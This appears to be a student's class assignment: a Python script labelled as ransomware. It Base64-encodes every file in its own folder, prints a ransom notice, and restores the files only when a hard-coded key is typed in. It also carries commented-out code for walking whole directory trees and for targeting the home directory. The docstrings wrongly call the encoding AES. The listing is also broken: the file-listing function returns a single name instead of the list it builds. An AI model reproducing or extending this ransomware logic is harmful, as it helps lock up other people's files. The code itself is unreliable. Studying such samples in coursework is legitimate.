"""
Name: Batyr Mammetesenov
Class: CMPSCI 130
Instructor: 

"""

#!/usr/bin/env python3
# Shebang

'''
WARNING!!! Do not run this command outside of this directory,
and do not use this script anywhere else.
This script is the simple ransomeware
that will encrypt files within the directory
'''

# Importing important packages

import logging # For logging debug messages.
import os # For interacting with the operating system (e.g., file paths).
import sys # For accessing system-specific parameters and functions.
import base64 # For encoding and decoding data using Base64.

class Ransomware:
    #  This class represents file encrypting ransomware.

    # Constructor for this class
    def __init__(self, name):
        self._name = name

    # Getter for name Property
    @property
    def name(self):
        # Name of the malware. 
        return self._name
    
    # Setter for name Property
    @name.setter
    def name(self, new_name):
        # Set a new name
        self._name = new_name

    # Key for encryption
    @property
    def key(self):
        return "ransomware_key"

    # Prompts the user to input a decryption key.
    def obtain_key(self):
        """ Obtain key from a user. """
        return input("Please enter a key: ")
    
    # Informing user
    def ransom_user(self):
        """ Inform user about encryption of his files. """
        print("Hi, all your files has been encrypted.")

    def encrypt_file(self, filename):
        """ Encrypt the given file with AES encryption algorithm.
        :param str filename: Name of the file.

        Note: The docstring mentions AES encryption, 
        but the code uses Base64 encoding, 
        which is not encryption but encoding.
        """
        try:
            # Load the content of file.
            with open(filename, 'r') as file:
                content = file.read()

            # Encripting the file
                encrypted_data = base64.b64encode(content.encode('utf-8'))

            # Rewriting the file with the encoded content.
            with open(filename, 'w') as file:
                file.write(encrypted_data.decode('utf-8'))

        except Exception as e:
            logging.error(f"Failed to encrypt {filename}: {e}")

    # Function for decrypting the file
    def decrypt_file(self, key, filename):

        """ Decrypt the given file with AES encryption algorithm.
        :param str key: Decryption key.
        :param str filename: Name of the file.
        """

        try:
            # Load the content of file.
            with open(filename, 'r') as file:
                # Read the file content
                content = file.read()

                # Decrypt the file content.
                decrypted_data = base64.b64decode(content)

                    # Rewrite the file with the decoded content.
            with open(filename, 'w') as file:
                content = file.write(decrypted_data.decode('utf-8'))

        except Exception as e:
            logging.error(f"Failed to decrypt {filename}: {e}")

    # Function finds files in folder
    def get_files_in_folder(self, path):
        """ Returns a `list` of all files in the folder.

        :param str path: Path to the folder
        """

        script_name = os.path.basename(sys.argv[0])
        # List the directory to get all files.
        files = []
        for file in os.listdir(path):
            # For the demonstration purposes ignore README.md
            # And this script itself.
            logging.debug(f"Found entry: {file}")
            if file == 'README.md' or file == script_name or file == '.git' or file == '.':
                logging.debug(f"Skipping file: {file}")
                continue

            file_path = os.path.join(path, file)

            if os.path.isfile(file_path):
                logging.debug(f"Adding file to list: {file_path}")
                files.append(file_path)

            else:
                logging.debug(f"Skipping non-file: {file_path}")
            
        return file
    
    """
    This function is not gonna be used because of the impact,
    but I decided to include it to implement recursion,
    If using it, ensure to run in virtual machine

    def get_all_files_in_directory(self, path):

        Recursively retrieves all files in the given directory and its subdirectories.

        :param str path: The root directory path.
        :return: A list of file paths.

        files = []
        for entry in os.scandir(path):
            try:
                if entry.is_file(follow_symlinks=False):
                    files.append(entry.path)
                elif entry.is_dir(follow_symlinks=False):
                    # Avoid recursion into special directories
                    if entry.name not in ('.', '..'):
                        files.extend(self.get_all_files_in_directory(entry.path))
            except PermissionError as e:
                logging.warning(f"Permission denied: {entry.path}")
            except Exception as e:
                logging.error(f"Error accessing {entry.path}: {e}")
        return files

    """

    
    def encrypt_files_in_folder(self, path):
        """ Encrypt all files in the given directory specified
        by path.

        :param str path: Path of the folder to be encrypted.
        :returns: Number of encrypted files (`int`).
        """

        num_encrypted_files = 0
        files = self.get_files_in_folder(path)

        # Encrypting files in folder
        for file in files:
            logging.debug("Encrypted file: {}".format(file))
            self.encrypt_file(file)
            num_encrypted_files+=1
        
        self.ransom_user()
        return num_encrypted_files
    
    def decrypt_files_in_folder(self, path):
        """ Decrypt all files in the given directory specified
        by path.

        :param str path: Path of the folder to be decrypted.
        """

        # Obtain a key from the user.
        key = self.obtain_key()
        if key != self.key:
            print("Sorry, Wrong key")
            return
        
        files = self.get_files_in_folder(path)
        
        # Decrypt each file in the directory.
        for file in files:
            self.decrypt_file(key, file)

if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create ransomware.
    ransomware = Ransomware('SimpleRansomware')

    # Encrypt files located in the same folder as our ransomware.
    path = os.path.dirname(os.path.abspath(__file__))

    number_encrypted_files = ransomware.encrypt_files_in_folder(path)
    print('Number of encrypted files: {}'.format(number_encrypted_files))

    ransomware.decrypt_files_in_folder(path)

# Example usage of encrypting all files in computer: 
# 
# DO NOT UNCOMMENT!!!
#
# if __name__ == '__main__':
#     rpath = '/~'
#     all_files = get_all_files_in_directory(rpath)
#     for file_path in all_files:
#         print(file_path)